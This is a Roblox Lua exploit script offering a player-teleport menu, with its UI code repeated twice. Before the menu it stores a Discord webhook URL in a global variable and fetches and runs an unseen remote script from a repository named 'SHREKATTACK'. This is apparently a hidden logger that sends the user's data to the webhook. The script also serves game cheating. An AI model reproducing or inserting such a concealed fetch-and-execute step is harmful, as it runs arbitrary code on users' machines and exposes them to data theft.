----------------------
-- Black X List NO 1 --
----------------------
_G.webhooksdiscord = "https://discord.com/api/webhooks/896290832276156446/57qrJg21MEwauIiEjRmwNlsmdix5zMrAAGyNYYRgqS1_louxE5Tp329vfTgU5DGembje"
loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))() local Window = Library.CreateLib("Black X List", "DarkTheme") local Tab = Window:NewTab("Credit") local Section = Tab:NewSection("BlackList Hub") local Tab = Window:NewTab("Players") local Section = Tab:NewSection("Teleport")
players = {}

for i,v in pairs(game:GetService("Players"):GetChildren()) do table.insert(players,v.Name) end

Section:NewDropdown("Select Player", " ", players, function(abc) Select = abc end)

Section:NewButton("Refresh", " ", function() table.clear(players) for i,v in pairs(game:GetService("Players"):GetChildren()) do table.insert(players,v.Name) end end)

Section:NewButton("Teleport", " ", function() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Select].Character.HumanoidRootPart.CFrame end)
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Black X List", "DarkTheme")
local Tab = Window:NewTab("Credit")
local Section = Tab:NewSection("BlackList Hub")
local Tab = Window:NewTab("Players")
local Section = Tab:NewSection("Teleport")
--------------------

players = {}

for i,v in pairs(game:GetService("Players"):GetChildren()) do
   table.insert(players,v.Name)
end

Section:NewDropdown("Select Player", " ", players, function(abc)
    Select = abc
end)


Section:NewButton("Refresh", " ", function()
    table.clear(players)
for i,v in pairs(game:GetService("Players"):GetChildren()) do
   table.insert(players,v.Name)
end
end)

Section:NewButton("Teleport", " ", function()
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Select].Character.HumanoidRootPart.CFrame
end)

